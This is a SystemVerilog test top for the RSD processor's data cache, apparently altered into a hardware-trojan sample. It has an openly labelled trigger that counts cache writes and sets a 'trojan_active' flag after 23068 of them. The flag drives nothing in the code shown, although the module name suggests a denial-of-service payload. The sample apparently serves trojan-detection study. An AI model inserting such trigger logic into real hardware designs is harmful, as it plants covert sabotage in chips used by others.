// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;
import CacheSystemTypes::*;
import OpFormatTypes::*;

module TestDCacheTop_trojan_DoS (
    input
        logic clk_p, clk_n, rstTrigger,
    output
        logic rstOut,
    input
        logic       [ MEM_ISSUE_WIDTH-1:0 ] dcRE,
        AddrPath    [ MEM_ISSUE_WIDTH-1:0 ] dcReadAddrIn,
        logic       dcWE,
        DataPath    dcWriteDataIn,
        AddrPath    dcWriteAddrIn,
        MemAccessSizeType dcWriteAccessSize,
        logic dcFillReq,
        logic dcFillerBusy,
        AddrPath dcFillAddr,
        WayPtr dcFillWayPtr,
        LineDataPath dcFillData,
    output
        logic        [ MEM_ISSUE_WIDTH-1:0 ] dcReadHit,
        DataPath     [ MEM_ISSUE_WIDTH-1:0 ] dcReadDataOut,
        logic        dcWriteHit,
        logic        dcFillAck,
        logic        dcMiss, dcReplace,
        AddrPath     dcMissAddr, dcReplaceAddr,
        WayPtr       dcVictimWayPtr,
        LineDataPath dcReplaceData
    );
    
    logic clk, memCLK, rst, mmcmLocked;
    
    AddrPath icReadAddrIn;
    
    `ifdef RSD_SYNTHESIS
        SingleClock clkgen( clk_p, clk_n, clk );

    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=23068)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 23068;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (dcWE) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

    `else
        assign clk = clk_p;
        initial memCLK <= FALSE;
        always_ff @ (posedge clk) memCLK <= ~memCLK;
    `endif
    
    ResetController rstController(.*);
    assign rstOut = rst;
    assign mmcmLocked = TRUE;

    // interfaces
    LoadStoreUnitIF loadStoreUnitIF( clk, rst );
    CacheSystemIF cacheSystemIF( clk, rst, memCLK );
    
    // processor modules
    DCache dCache( loadStoreUnitIF, cacheSystemIF );
    
    always_comb begin
        // Input of this module.
        loadStoreUnitIF.dcWE = dcWE;
        loadStoreUnitIF.dcWriteDataIn = dcWriteDataIn;
        loadStoreUnitIF.dcWriteAddrIn = dcWriteAddrIn;
        loadStoreUnitIF.dcWriteAccessSize = dcWriteAccessSize;
        for ( int i = 0; i < MEM_ISSUE_WIDTH; i++ ) begin
            loadStoreUnitIF.dcRE[i] = dcRE[i];
            loadStoreUnitIF.dcReadAddrIn[i] = dcReadAddrIn[i];
        end
        cacheSystemIF.dcFillReq = dcFillReq;
        cacheSystemIF.dcFillerBusy = dcFillerBusy;
        cacheSystemIF.dcFillAddr = dcFillAddr;
        cacheSystemIF.dcFillWayPtr = dcFillWayPtr;
        cacheSystemIF.dcFillData = dcFillData;
        
        // Output of this module.
        for ( int i = 0; i < MEM_ISSUE_WIDTH; i++ ) begin
            dcReadHit[i] = loadStoreUnitIF.dcReadHit[i];
            dcReadDataOut[i] = loadStoreUnitIF.dcReadDataOut[i];
        end
        dcWriteHit = loadStoreUnitIF.dcWriteHit;
        dcFillAck = cacheSystemIF.dcFillAck;
        dcMiss = cacheSystemIF.dcMiss;
        dcReplace = cacheSystemIF.dcReplace;
        dcMissAddr = cacheSystemIF.dcMissAddr;
        dcReplaceAddr = cacheSystemIF.dcReplaceAddr;
        dcVictimWayPtr = cacheSystemIF.dcVictimWayPtr;
        dcReplaceData = cacheSystemIF.dcReplaceData;
    end
    
endmodule
